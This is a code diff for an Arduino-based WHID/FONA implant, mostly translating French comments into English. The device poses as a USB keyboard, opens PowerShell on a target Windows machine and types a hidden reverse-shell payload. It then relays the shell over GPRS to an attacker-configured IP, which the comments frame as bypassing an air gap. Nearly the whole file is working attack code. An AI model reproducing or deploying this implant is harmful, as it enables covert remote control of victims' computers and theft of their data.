@@ -1,12 +1,12 @@
-#include <Keyboard.h>//bibliothèque permettant d'écrire su l'ordinateur cible an tant que clavier
+#include <Keyboard.h>//library for using WHID as a keyboard
 
-#include "Adafruit_FONA.h" //Bibliothèque du fona 
+#include "Adafruit_FONA.h" //Library for controlling the fona
 #define FONA_RST 4
 
-HardwareSerial *fonaSerial = &Serial1; //Le fona est branché sur les pins 0 et 1, soit le port série 1
+HardwareSerial *fonaSerial = &Serial1; //The fona is wired on pins 0 and 1, it represent the serial port 1
 Adafruit_FONA fona = Adafruit_FONA(FONA_RST);
 
-void typeKey(uint8_t key) { //fonction d'appui sur une touche 
+void typeKey(uint8_t key) { //function typing a key  
   Keyboard.press(key);
   delay(50);
   Keyboard.release(key);
@@ -17,12 +17,10 @@ void typeKey(uint8_t key) { //fonction d'appui sur une touche
 void setup()
 { 
   Keyboard.begin();
-  //char fonaNotificationBuffer[64];
-  //char smsBuffer[150];
-  Serial.begin(230400);// initialisation des liaison séries (liaison de debug) 
-  SerialUSB.begin (230400); // initialisation de la liaison avec l'ordinateur
-  fonaSerial->begin(115200);//Initialisationde la liaison avec le FONA 
-  if (! fona.begin(*fonaSerial)) { // début de la communication avec le FONA
+  Serial.begin(230400);// Begin debug connection with a computer listening on serial
+  SerialUSB.begin (230400); // Begin connection with the target computer
+  fonaSerial->begin(115200);//Initialisation transmission with FONA
+  if (! fona.begin(*fonaSerial)) { // Begin transmission with FONA
     Serial.println(F("NO SIM800!"));
     while (1);
   }
@@ -41,16 +39,18 @@ void setup()
     delay(500);
   }
   fona.sendCheckReply(F("AT+CIPMODE=1"),F("OK"),100);
-
-  fona.setGPRSNetworkSettings(F("orange"), F("orange"), F("orange"));//configuration de l'APN (nom, utilisateur, mot de passe)
+ //####################################################### ENTER YOUR APN CONFIGURATION HERE!###################################
+ //#                                                                                                                                 #
+ //###################################################################################################################################
+  fona.setGPRSNetworkSettings(F("name"), F("user"), F("password"));//APN confuguration (name, user, password)
          
-  if (!fona.enableGPRS(true)) //activation du GPRS
+  if (!fona.enableGPRS(true)) //Activating GPRS
     Serial.println(F("Failed to turn on"));
- fona.sendCheckReply(F("AT+CGATT?"),F("OK"),100);// vérification de l'état du GPRS
+ fona.sendCheckReply(F("AT+CGATT?"),F("OK"),100);//Chack if GPRS is correctly activated
   
  fona.sendCheckReply(F("AT+CIICR"),F("OK"),100);// 
 
- fona.sendCheckReply(F("AT+CIFSR"),F("OK"),100);// récupération de l'adresse ip locale de la carte
+ fona.sendCheckReply(F("AT+CIFSR"),F("OK"),100);// Get ip address of the card
  
  delay(100);
  //####################################################### ENTER YOUR IP ADDRESS AND ITS PORT HERE!###################################
@@ -60,23 +60,23 @@ void setup()
     while(1);
  //fona.sendCheckReply(F("AT+IFC=2,2"),F("OK"),100); 
 
- Keyboard.press(KEY_LEFT_GUI);
+ Keyboard.press(KEY_LEFT_GUI);// Press power key
    delay(50);
-   Keyboard.press((char) 114); //In Decimal, is r
+   Keyboard.press((char) 114); //Press R
    Keyboard.releaseAll();
    delay(1000);
-   Keyboard.print("powershell"); // ouverture powershell 
+   Keyboard.print("powershell"); // Open a powershell 
    typeKey(KEY_RETURN);
-   delay(1000);
-   //camoufl(); //payload voir annexe 
-    Keyboard.print("$pt = New-Object -TypeName System.Diagnostics.Process;$it = $pt.StartInfo;$it.CreateNoWindow = $true;$it.UseShellExecute = $false;$it.RedirectStandardInput = $true;$it.RedirectStandardOutput = $true;$it.RedirectStandardError = $true;$it.FileName = \"powershell.exe\";$null = $pt.Start();$ct=$pt.StandardInput;$st=$pt.StandardOutput;"); 
+   delay(1000); // wating for the powershell to start 
+   //typing payload, see revershell.ps1
+   Keyboard.print("$pt = New-Object -TypeName System.Diagnostics.Process;$it = $pt.StartInfo;$it.CreateNoWindow = $true;$it.UseShellExecute = $false;$it.RedirectStandardInput = $true;$it.RedirectStandardOutput = $true;$it.RedirectStandardError = $true;$it.FileName = \"powershell.exe\";$null = $pt.Start();$ct=$pt.StandardInput;$st=$pt.StandardOutput;"); 
    Keyboard.print(F("$ct.WriteLine(\" `$c=(gwmi Win32_SerialPort|Where-Object{`$_.PNPDeviceID -match `\"ID_2341&PID_804D`\"}).DeviceID;"));
    Keyboard.print(F("`$po=new-Object System.IO.Ports.SerialPort `$c,230400,None,8,one;`$po.open();"));
    //typeKey(KEY_RETURN);
   Keyboard.print("`$p = New-Object -TypeName System.Diagnostics.Process;`$i = `$p.StartInfo;`$i.CreateNoWindow = `$true;`$i.UseShellExecute = `$false;`$i.RedirectStandardInput = `$true;`$i.RedirectStandardOutput = `$true;`$i.RedirectStandardError = `$true;`$i.FileName = `\"powershell.exe`\";`$null = `$p.Start();`$c=`$p.StandardInput;`$s=`$p.StandardOutput;"); 
   Keyboard.print("while(1){do {`$de=[char]`$s.Read();`$po.Write(`$de);} while (`$de -ne `\">`\");`$c.WriteLine(`$po.ReadLine())}\") ");
   typeKey(KEY_RETURN);
-  Keyboard.print("exit");
+  Keyboard.print("exit"); // close powershell 
   typeKey(KEY_RETURN);
  fonaSerial->readString();
   
@@ -84,40 +84,33 @@ void setup()
 
 void loop()
 {
-  if (fonaSerial->available()) //si données dispo sur liaison fona/carte
+  if (fonaSerial->available()) //waiting for data incoming by the gprs connection 
    {
     
     Serial.print("reçu");
     delay( 1000);  
-    String d=fonaSerial->readStringUntil('\n'); // lecture des données 
+    String d=fonaSerial->readStringUntil('\n'); // reading data
     Serial.print(d);
-    char v[d.length()];// conversion de string en char[]
+    char v[d.length()];// converting string to char
     strcpy(v, d.c_str());
-    SerialUSB.write(v); // ecriture des données sur la liaison série de l'ordinateur 
+    SerialUSB.write(v); // sending data to the target computer
     SerialUSB.write("\n");
     
 
  
    }
    
-   if (SerialUSB.available()) // si données dispo sur liaison Carte/ordinateur 
+   if (SerialUSB.available()) //waiting for data incomming from target serial connection 
    {
     
     
-    String BypassAirGap = SerialUSB.readStringUntil('\n'); // lecture des données proventant de l'ordinateur cible // accélération possible 
-    Serial.print(BypassAirGap);// affichage de =s données lues (debug)
-    char p[BypassAirGap.length()];// conversion de string en char[]
+    String BypassAirGap = SerialUSB.readStringUntil('\n'); // reading data from thin connection
+    Serial.print(BypassAirGap);// printing for debug data
+    char p[BypassAirGap.length()];//converting string to char
     strcpy(p, BypassAirGap.c_str());
-    //fonaSerial->write("AT+CIPSEND");
     delay (500);
-    //fona.sendCheckReply(F("AT+CIPSEND"),F(">"),100);//envoi de la commande d'envoi et attente de la reponse du fona
-    //indiquant qu'elle est prête 
-    fonaSerial->write(p);// transmission des données vers le FONA 
+    fonaSerial->write(p);//transmittiong data to the attacker through fona
     fonaSerial->write("\n");
-    //fonaSerial->write(0x1a);//envoi des données 
     delay (100);
-    //Serial.print(fonaSerial->readString());//attente du "send ok"
-
-
    }
 }
